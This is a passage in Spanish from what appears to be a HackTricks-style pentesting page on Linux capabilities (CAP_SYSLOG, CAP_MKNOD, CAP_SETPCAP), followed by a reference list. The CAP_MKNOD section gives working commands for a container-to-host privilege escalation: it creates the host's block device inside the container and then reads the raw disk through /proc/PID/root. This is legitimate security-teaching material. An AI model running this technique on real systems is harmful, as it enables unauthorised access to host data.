[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) se separó del más amplio **CAP_SYS_ADMIN** en Linux 2.6.37, otorgando específicamente la capacidad de usar la llamada `syslog(2)`. Esta capability permite ver direcciones del kernel mediante `/proc` e interfaces similares cuando el ajuste `kptr_restrict` está establecido en 1, lo que controla la exposición de las direcciones del kernel. Desde Linux 2.6.39, el valor predeterminado de `kptr_restrict` es 0, lo que significa que las direcciones del kernel quedan expuestas, aunque muchas distribuciones lo establecen en 1 (ocultar las direcciones excepto para uid 0) o 2 (ocultar siempre las direcciones) por motivos de seguridad.<sup>[[14]](#references)</sup>

Además, **CAP_SYSLOG** permite acceder a la salida de `dmesg` cuando `dmesg_restrict` está establecido en 1. A pesar de estos cambios, **CAP_SYS_ADMIN** conserva la capacidad de realizar operaciones `syslog` debido a precedentes históricos.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) amplía la funcionalidad de la llamada al sistema `mknod` más allá de la creación de archivos normales, FIFOs (named pipes) o UNIX domain sockets. Permite específicamente crear special files, entre los que se incluyen:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, como los dispositivos terminales.
- **S_IFBLK**: Block special files, como los dispositivos de disco.

Esta capability es útil para procesos que necesitan crear device files, incluidos dispositivos de caracteres o de bloques.<sup>[[14]](#references)</sup>

Está incluida en el conjunto de capabilities predeterminado documentado de Docker; verifica la configuración real del runtime en lugar de asumir que cada deployment usa los mismos valores predeterminados ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Esta capability permite realizar privilege escalations (mediante la lectura completa del disco) en el host, bajo estas condiciones:<sup>[[7]](#references)</sup>

1. Tener acceso inicial al host (Unprivileged).
2. Tener acceso inicial al container (Privileged (EUID 0), y `CAP_MKNOD` efectiva).
3. El host y el container deben compartir el mismo user namespace.

**Pasos para crear y acceder a un block device en un container:**

1. **En el host como un usuario estándar:**

- Determina tu ID de usuario actual con `id`, por ejemplo, `uid=1000(standarduser)`.
- Identifica el dispositivo objetivo, por ejemplo, `/dev/sdb`.

2. **Dentro del container como `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De vuelta en el Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Este enfoque permite al usuario estándar acceder y potencialmente leer datos de `/dev/sdb` a través del contenedor cuando el dispositivo, los namespaces y los permisos están configurados como se describe.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

En los kernels de Linux actuales con file capabilities, **`CAP_SETPCAP`** permite a un thread añadir capabilities de su bounding set a su inheritable set, eliminar capabilities de su bounding set y cambiar sus securebits. No permite que un proceso otorgue arbitrariamente capabilities a otro proceso; ese comportamiento solo se aplica a kernels anteriores a la versión 2.6.25 sin compatibilidad con file capabilities.<sup>[[14]](#references)</sup>

La llamada al sistema `capset()` puede ajustar los conjuntos effective, permitted e inheritable del propio thread, pero el nuevo conjunto permitted no puede contener capabilities que no estén en el conjunto permitted existente, y las actualizaciones de inheritable siguen estando sujetas a las restricciones del kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - laboratorios de escalada de privilegios de Linux](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - escalada de privilegios en Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Conceptos básicos de Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Aprovechamiento de Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities excesivas](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abuso del acceso a mount namespaces mediante /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: por qué existen y cómo funcionan](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Comprendiendo las Capabilities en Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC para evadir seccomp si ptrace está permitido](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Cómo escapar de varias soluciones chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit original de escape de Docker mediante CAP_DAC_READ_SEARCH, por Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Análisis del exploit de escape de Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - página del manual de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - página del manual de Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - página del manual de Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - página del manual de Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Ejecución de containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - página del manual de Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - página del manual de Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - página del manual de Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
